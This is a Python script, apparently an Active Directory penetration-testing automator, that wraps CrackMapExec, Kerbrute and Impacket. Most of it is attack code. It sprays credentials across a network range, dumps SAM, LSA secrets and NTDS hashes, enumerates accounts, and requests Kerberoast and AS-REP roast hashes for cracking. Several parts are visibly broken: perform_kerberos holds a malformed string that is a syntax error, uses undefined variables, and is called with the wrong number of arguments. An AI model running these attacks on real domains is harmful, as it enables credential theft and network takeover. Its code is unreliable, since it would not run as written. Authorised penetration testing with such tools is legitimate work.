import os
import subprocess
import sys
import re
import time
from datetime import datetime

print(r"""  
            d8888 8888888b.                    888                                   888                    
           d88888 888  "Y88b                   888                                   888                    
          d88P888 888    888                   888                                   888                    
         d88P 888 888    888  8888b.  888  888 888888 .d88b.  88888b.d88b.   8888b.  888888 .d88b.  888d888 
        d88P  888 888    888     "88b 888  888 888   d88""88b 888 "888 "88b     "88b 888   d88""88b 888P"   
       d88P   888 888    888 .d888888 888  888 888   888  888 888  888  888 .d888888 888   888  888 888     
      d8888888888 888  .d88P 888  888 Y88b 888 Y88b. Y88..88P 888  888  888 888  888 Y88b. Y88..88P 888     
     d88P     888 8888888P"  "Y888888  "Y88888  "Y888 "Y88P"  888  888  888 "Y888888  "Y888 "Y88P"  888
""")

# This checks to see if the files below exists and deletes them as they will be part of the output file with a IP and DTG
def delete_file(filename):
    """kerberoast_hash.txt"""
    """asreproast_hash.txt"""
    try:
        os.remove(filename)
    except OSError:
        pass

# Installs Seclists, crackmapexec, impacket, and downloads kerbrute to the local folder
def install_packages():
    # seclists
    subprocess.run(['sudo', 'apt', 'install', 'seclists', '-y'])
    # crackmapexec
    subprocess.run(['sudo', 'apt', 'install', 'crackmapexec', '-y'])
    # ntpdate
    subprocess.run(['sudo', 'apt', 'install', 'ntpdate', '-y'])
    # impacket
    subprocess.run(['sudo', 'apt', 'install', 'python3-impacket', '-y'])
    # tqdm for the progress bar
    subprocess.run(['pip', 'install', 'tqdm'])
    # Check for kerbrute

# Creates a standard filename for the functions
def generate_single_filename(ip):
    # Replace slashes with underscores
    ip = ip.replace("/", "_")
    return f"{ip}_{datetime.now().strftime('%d_%b_%Y_%H%M')}.txt"

# Function to append an entry to /etc/hosts
def append_to_hosts(dc_ip, domain_name):
    try:
        with open("/etc/hosts", "a") as hosts_file:
            hosts_file.write(f"{dc_ip}{' '*7}{domain_name}\n")
        print(f"Added {domain_name} with IP {dc_ip} to /etc/hosts.")
    except Exception as e:
        print(f"Failed to append to /etc/hosts: {e}")
        sys.exit(1)


def perform_kerberos(domain_name, username, password, dc_ip, user_list_path=None):
    with open("/etc/hosts", "a") as hosts_file:
        hosts_file.write(f"{dc_ip}{' '*7}{domain_name}\n")
    
    with open(output_filename, "a") as f:
        if user_list_path:
            subprocess.run(["impacket-GetNPUsers", "-usersfile", user_list_path, "-dc-ip", dc_ip, "-request", f"{domain_name}/", "-format", "hashcat"], "| grep -v "KDC_ERR_C_PRINCIPAL_UNKNOWN"", stdout=output)
        subprocess.run(["impacket-GetUserSPNs", f"{domain_name}/{username}:{password}", "-dc-ip", dc_ip, "-request"], stdout=output)

def execute_kerbrute(dc_ip, domain_name):
    print("1. Use built-in user list")
    print("2. Use custom user list")
    choice = input("Choose an option (1 or 2): ")

    if choice == '1':
        user_list_path = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
    else:
        user_list_path = input("Enter the path to your user list: ")
    
    print("\n*****Kerbrute attack in progress, please wait*****")
    subprocess.run(['chmod', '+x', 'kerbrute_linux_amd64'])
    subprocess.run(['./kerbrute_linux_amd64', 'userenum', '--dc', dc_ip, '-d', domain_name, user_list_path, '--downgrade'])
    print("\n*****Kerbrute attack complete*****")
    
def execute_crackmapexec(cidr_range, domain_name, output_filename):
    # Creates an empty file
    if not os.path.exists(output_filename):
        with open(output_filename, 'w') as f:
            pass

    with open(output_filename, 'a') as f:	
        known_username = input("Do you know the username? Select n to enter username list. (y/n): ").strip().lower()
        if known_username == 'y':
            username = input("Please enter the username for CrackMapExec: ").strip()
        else:
            username_list_path = input("Enter the path to your username list: ").strip()
            username = f" {username_list_path}"

    known_password = input("Do you know the password? Select n to enter password list. (y/n): ").strip().lower()
    if known_password == 'y':
        password = input("Please enter the password for CrackMapExec: ").strip()
    else:
        password_list_path = input("Enter the path to your password list: ").strip()
        password = f" {password_list_path}"
    
    
     # SMB command and flags
    smb_base_command = ['crackmapexec', 'smb', cidr_range, '-u', username, '-p', password]
    smb_cme_flags = [
        '--shares', '--pass-pol', '--users', '--sam --continue-on-success', '--sam',
        '--lsa --continue-on-success', ' --lsa', '--ntds --continue-on-success',
        '--ntds vss --continue-on-success' , '--ntds'
    ]

    # LDAP command and flags
    ldap_base_command = ['crackmapexec', 'ldap', cidr_range, '-u', username, '-p', password]
    ldap_cme_flags = [
        '--asreproast asreproast_hash.txt', '--kerberoasting kerberoast_hash.txt'
    ]

  

    with open(output_filename, 'a') as f:
    	# Run SMB commands
    	for flags in smb_cme_flags:
            command = smb_base_command + flags.split()
            print("Executing SMB command:", ' '.join(command))
            result = subprocess.run(command, stdout=subprocess.PIPE, input="\n", text=True)
            
            # Write the output to file and check for patterns
            f.write(result.stdout)
            if "Pwn3d!" in result.stdout:
                print(result.stdout)  # This will print the matching lines to the console

    with open(output_filename, 'a') as f:
        # Run LDAP commands
        for flags in ldap_cme_flags:
            command = ldap_base_command + flags.split()
            print("Executing LDAP command:", ' '.join(command))
            subprocess.run(command, stdout=f, input="\n", text=True)  # This presses enter after every command
            if "asreproast asreproast_hash.txt" in flags:
                delete_file("asreproast_hash.txt")
            if "kerberoasting kerberoast_hash.txt" in flags:
                delete_file("kerberoast_hash.txt")
    
    return cidr_range

def main_menu():
    print("\n--------- Active Directory Penetration Testing Tools ---------")
    print("0. Install packages - Seclists, Crackmapexec, Impacket, Ntpdate")
    print("1. Crackmapexec - Enumeration of Domain Controller")
    print("2. Kerbrute - Enumerate valid AD accounts via Kerberos Pre-Authentication")
    print("3. Impacket")
    print("4. Exit")
    try:
        choice = input("Select an option (0-4): ")
    except EOFError:
        print("Unexpected end of input detected. Exiting program.")
        sys.exit(1)

    if choice == "0":
        install_packages()
        
    elif choice == "1":
        domain_name = input("Enter the domain name: ")
        cidr_range = input("Provide a CIDR range - This will be noisy! ")
        print("This command will output the results in this directory ""IP_DTG""")
        output_filename = generate_single_filename(cidr_range)  # use cidr_range instead of entered_ip
        dc_ip = input("Enter the Domain Controller IP to add to /etc/hosts, leave blank if you dont want to add anyting ")
        add_to_hosts = input("Do you want to enter the DC IP to the /etc/hosts? (y/n): ").strip().lower()
        if add_to_hosts == 'y':
            append_to_hosts(dc_ip, domain_name)  # Only call if user confirms with a y
        entered_ip = execute_crackmapexec(cidr_range, domain_name, output_filename)

    elif choice == "2":
        dc_ip = input("Please enter the DC IP: ")
        domain_name = input("Please enter the domain name: ")
        add_to_hosts = input("Do you want to enter the DC IP to the /etc/hosts? (y/n): ").strip().lower()  
        if add_to_hosts == 'y':
            append_to_hosts(dc_ip, domain_name)  # Only call if user confirms with a y
        subprocess.run(['chmod', '+x', 'kerbrute_linux_amd64'])
        execute_kerbrute(dc_ip, domain_name)
        
    elif choice == "3":
        dc_ip = input("Please enter the DC IP: ")
        domain_name = input("Please enter the domain name: ")
        add_to_hosts = input("Do you want to enter the DC IP to the /etc/hosts? (y/n): ").strip().lower()  # Ask user
        if add_to_hosts == 'y':
            append_to_hosts(dc_ip, domain_name)  # Only call if user confirms with a y
        kerberos_username = input("Please enter the username for the Kerberos attack: ")
        kerberos_password = input("Please enter the password for the Kerberos attack: ")
        user_list_path = input("Enter the path to user list (or 'None' if not applicable): ")
        user_list_path = None if user_list_path.lower() == 'none' else user_list_path
        append_to_hosts(dc_ip, domain_name)  # Call function to append to /etc/hosts
        perform_kerberos(domain_name, kerberos_username, kerberos_password, dc_ip, user_list_path, output_filename)
        
    elif choice == "4":
        sys.exit(0)
    else:
        print("Invalid choice! Please select a valid option.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("This script requires elevated permissions. Please run with sudo.")
        sys.exit(1)
    
    
    while True:
        main_menu()
